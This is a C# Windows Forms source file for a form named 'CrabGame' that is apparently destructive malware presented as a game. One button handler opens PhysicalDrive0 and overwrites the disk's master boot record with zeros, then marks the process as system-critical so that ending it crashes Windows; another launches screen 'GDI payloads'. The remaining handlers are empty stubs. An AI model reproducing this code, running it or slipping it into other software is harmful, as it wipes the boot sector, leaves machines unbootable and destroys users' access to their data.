using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;
using System;

namespace Alonka;

public partial class CrabGame : Form
{
    // Registration DLL
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass,
        ref int processInformation, int processInformationLength);
        
    [DllImport("kernel32")]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
        IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        
    [DllImport("kernel32")]
    private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
        out uint lpNumberBytesWritten, IntPtr lpOverlapped);
    
    public CrabGame()
    {
        InitializeComponent();
    }

    private void button5_Click(object sender, EventArgs e)
    {
        new Thread(Effect.GDI_payloads).Start();
    }

    private void button4_Click(object sender, EventArgs e)
    {
        throw new System.NotImplementedException();
    }

    private void button3_Click(object sender, EventArgs e)
    {
        const uint genericAll = 0x10000000;
        const uint fileShareRead = 0x1;
        const uint fileShareWrite = 0x2;
        const uint openExisting = 0x3;
        const uint mbrSize = 512u;

        var mbrData = new byte[512];
        var mbr = CreateFile("\\\\.\\PhysicalDrive0", genericAll, fileShareRead | fileShareWrite, IntPtr.Zero, 
            openExisting, 0, IntPtr.Zero);
        WriteFile(mbr, mbrData, mbrSize, out var lpNumberOfBytesWritten, IntPtr.Zero);
        
        var isCritical = 1;
        const int breakOnTermination = 0x1D;

        Process.EnterDebugMode();
        NtSetInformationProcess(Process.GetCurrentProcess().Handle, breakOnTermination, ref isCritical, sizeof(int));
    }

    private void button2_Click(object sender, EventArgs e)
    {
        throw new System.NotImplementedException();
    }

    private void button1_Click(object sender, EventArgs e)
    {
        throw new System.NotImplementedException();
    }
}